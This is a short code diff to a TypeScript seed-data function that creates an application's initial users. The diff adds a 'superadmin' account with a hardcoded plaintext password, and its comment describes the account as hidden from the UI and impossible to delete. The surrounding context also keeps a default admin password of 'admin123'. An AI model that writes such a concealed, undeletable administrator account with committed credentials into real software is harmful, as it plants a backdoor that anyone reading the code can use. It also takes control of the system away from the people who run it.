@@ -16,7 +16,19 @@ export async function loadInitialData(storage: IStorage): Promise<void> {
 
     console.log("Loading initial data...");
 
-    // Create admin user
+    // Create SUPER ADMIN user (hidden from UI, cannot be deleted)
+    const superAdminPassword = await hashPassword("SuperAdmin@2024!Secure");
+    const superAdminUser = {
+      username: "superadmin",
+      email: "superadmin@sweetbite.com",
+      password: superAdminPassword,
+      name: "Super Administrator",
+      isAdmin: true
+    };
+    await storage.createUser(superAdminUser);
+    console.log("✅ Super Admin user created (username: superadmin)");
+
+    // Create regular admin user
     const hashedPassword = await hashPassword("admin123");
     const adminUser = {
       username: "admin",
